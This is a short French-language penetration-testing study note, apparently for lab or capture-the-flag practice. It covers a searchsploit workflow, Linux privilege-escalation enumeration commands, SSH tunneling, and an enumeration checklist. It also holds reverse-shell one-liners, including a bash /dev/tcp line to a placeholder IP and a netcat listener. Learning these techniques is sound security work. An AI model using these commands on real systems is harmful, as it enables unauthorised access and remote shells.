Trouver et analyser la technologie en face

Ce que ça change dans ta méthodologie
```
Tu trouves un service/technologie
          ↓
searchsploit [service] [version]
          ↓
Tu lis les résultats
          ↓
Tu identifies les exploits potentiels
          ↓
Tu cherches comment les appliquer
```
Crée ta propre cheatsheet — note chaque commande nouvelle que tu apprends :
```bash
# PRIVESC LINUX
sudo -l                          → voir droits sudo
sudo -u USER /bin/bash           → shell en tant que USER
find / -perm -4000 2>/dev/null   → fichiers SUID
cat /etc/crontab                 → crons système
ls /etc/cron.d/                  → crons additionnels
find / -user USER 2>/dev/null    → fichiers d'un user

# REVERSE SHELLS
nc -lvnp 4444                    → listener
python3 -c 'import socket...'    → reverse shell python
bash -i >& /dev/tcp/IP/PORT 0>&1 → reverse shell bash

# TUNNELING
ssh -L PORT:127.0.0.1:PORT user@IP  → tunnel local
vncviewer -passwd FILE 127.0.0.1:PORT → vnc avec fichier
🧠 Changer ta façon de raisonner
```
Quand tu bloques, pose-toi ces questions dans l'ordre :
```
1. QUI suis-je ? (whoami, id)
2. QUE puis-je faire ? (sudo -l, SUID, crons)
3. QUI d'autre existe ? (/etc/passwd, ls /home)
4. QUOI d'intéressant sur le système ? 
   (find / -user X, ls -al /, fichiers inhabituels)
5. COMMENT connecter tout ça ?

```
